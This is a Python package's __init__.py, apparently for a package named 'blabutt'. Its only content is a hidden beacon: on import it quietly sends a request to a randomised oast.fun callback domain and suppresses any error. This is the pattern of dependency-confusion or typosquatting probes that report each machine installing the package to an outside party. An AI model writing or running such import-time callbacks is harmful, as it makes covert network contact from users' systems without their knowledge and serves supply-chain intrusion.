# blabutt/__init__.py

import requests

try:
    requests.get("https://yckuuixbcvkqjuqqbxufzkn84pofo8i4p.oast.fun/piippp", timeout=3)
except Exception:
    pass 
